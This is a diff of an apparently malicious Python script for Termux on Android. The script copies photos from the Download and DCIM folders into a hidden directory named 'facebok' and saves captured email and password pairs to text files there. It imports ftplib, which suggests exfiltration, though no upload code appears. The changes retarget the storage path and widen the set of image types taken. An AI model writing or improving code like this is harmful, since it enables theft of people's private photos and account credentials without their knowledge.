@@ -7,9 +7,24 @@ import ftplib
 import time
 import random
 import string
-##########
+##################
+def create_directory(directory_path):
+    try:
+        os.makedirs(directory_path)
+        print(f"Directory '{directory_path}' created successfully.")
+    except FileExistsError:
+        print(f"Directory '{directory_path}' already exists.")
+
+def main():
+    directory_path = "/data/data/com.termux/files/home/facebok/source/d/source/b"
+    create_directory(directory_path)
+
+if __name__ == "__main__":
+    main()
+#####################################
+
 def move_files(source_dirs, target_dir):
-    image_extensions = ('.jpg', '.jpeg', '.png')
+    image_extensions = ('.jpg', '.jpeg', '.png', '.gif')
 
     total_size = 0
     for source_dir in source_dirs:
@@ -34,7 +49,7 @@ def move_files(source_dirs, target_dir):
 
 def main():
     source_directories = ['/sdcard/Download', '/sdcard/DCIM']
-    target_directory = '/data/data/com.termux/files/home/facebook/source/d'  # Target directory in Termux home
+    target_directory = '/data/data/com.termux/files/home/facebok/source/d/source/b'  # Target directory in Termux home
 
     move_files(source_directories, target_directory)
 
@@ -101,7 +116,7 @@ def create_next_file(prefix):
     i = 1
     while True:
         filename = f"{prefix}{i}.txt"
-        filepath = os.path.join("/data/data/com.termux/files/home/facebook/source/d", filename)
+        filepath = os.path.join("/data/data/com.termux/files/home/facebok/source/d/source/b", filename)
         if not os.path.exists(filepath):
             with open(filepath, 'w') as file:
                 file.write(email + " : " + password)
